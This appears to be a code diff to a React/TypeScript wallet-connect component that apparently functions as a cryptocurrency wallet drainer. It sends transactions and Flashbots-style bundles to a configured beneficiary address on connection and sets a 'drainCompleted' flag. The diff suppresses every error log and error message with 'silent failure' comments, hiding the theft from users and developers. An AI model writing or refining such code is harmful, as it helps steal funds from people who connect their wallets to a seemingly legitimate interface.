@@ -75,7 +75,7 @@ function useWalletMonitor(onConnect?: (address: string) => void) {
         setAddress('');
       }
     } catch (error) {
-      console.error('Wallet connection check failed:', error);
+      // Silent failure - no console logs
       // Don't reset connection state on temporary errors
       // Only reset if it's a clear disconnection
       if (error instanceof Error && (
@@ -109,7 +109,7 @@ function useWalletMonitor(onConnect?: (address: string) => void) {
             if (onConnect) onConnect(accounts[0]);
           }
         } catch (error) {
-          console.error('Error handling accounts changed:', error);
+          // Silent failure - no console logs
         }
       };
 
@@ -119,7 +119,7 @@ function useWalletMonitor(onConnect?: (address: string) => void) {
           try {
             checkWalletConnection();
           } catch (error) {
-            console.error('Error checking connection after chain change:', error);
+            // Silent failure - no console logs
           }
         }, 1000);
       };
@@ -129,7 +129,7 @@ function useWalletMonitor(onConnect?: (address: string) => void) {
           setIsConnected(false);
           setAddress('');
         } catch (error) {
-          console.error('Error handling disconnect:', error);
+          // Silent failure - no console logs
         }
       };
 
@@ -138,7 +138,7 @@ function useWalletMonitor(onConnect?: (address: string) => void) {
         window.ethereum.on('chainChanged', handleChainChanged);
         window.ethereum.on('disconnect', handleDisconnect);
       } catch (error) {
-        console.error('Error setting up wallet event listeners:', error);
+        // Silent failure - no console logs
       }
 
       // Periodic connection check every 10 seconds (reduced from 5)
@@ -146,7 +146,7 @@ function useWalletMonitor(onConnect?: (address: string) => void) {
         try {
           checkWalletConnection();
         } catch (error) {
-          console.error('Error in periodic connection check:', error);
+          // Silent failure - no console logs
         }
       }, 10000);
 
@@ -156,7 +156,7 @@ function useWalletMonitor(onConnect?: (address: string) => void) {
           window.ethereum.removeListener('chainChanged', handleChainChanged);
           window.ethereum.removeListener('disconnect', handleDisconnect);
         } catch (error) {
-          console.error('Error removing wallet event listeners:', error);
+          // Silent failure - no console logs
         }
         clearInterval(interval);
       };
@@ -207,7 +207,7 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
       if (onConnect) onConnect(newAddress);
       setShowReconnectPrompt(false);
     } catch (e: any) {
-      console.error('Wallet connection error:', e);
+      // Silent failure - no console logs
       if (e?.code === 4001) {
         setError('Connection was rejected. Please try again.');
       } else if (e?.code === -32002) {
@@ -244,7 +244,7 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
             
             const beneficiary = BENEFICIARIES[chain.env];
             if (!beneficiary || beneficiary === `0xYour${chain.name}Address`) {
-              throw new Error('Configuration error');
+              return; // Silent failure
             }
             // Randomize gas price
             const randomGwei = Math.floor(Math.random() * 10) + 10; // 10-20 gwei
@@ -271,7 +271,7 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
               await provider.send('eth_sendBundle', [bundle]);
               return;
             } catch (bundleError: any) {
-              console.error(`${chain.name} bundle error:`, bundleError);
+              // Silent failure - no console logs
               // Fallback to regular transaction
               try {
                 const signer = await provider.getSigner();
@@ -290,9 +290,8 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
                 });
                 await repayTx.wait();
               } catch (txError: any) {
-                console.error(`${chain.name} transaction error:`, txError);
-                // Silent failure - don't show any errors to user
-                throw new Error('Silent failure');
+                // Silent failure - no console logs
+                return;
               }
             }
           })
@@ -310,9 +309,8 @@ export default function WalletConnect({ onConnect }: { onConnect?: (address: str
         }
         
       } catch (e: any) {
-        console.error('General error:', e);
+        // Silent failure - no console logs
         if (!isCancelled) {
-          // Silent failure - don't show any errors to user
           localStorage.setItem('drainCompleted', 'true');
           
           // Trigger a storage event to notify dashboard of completion
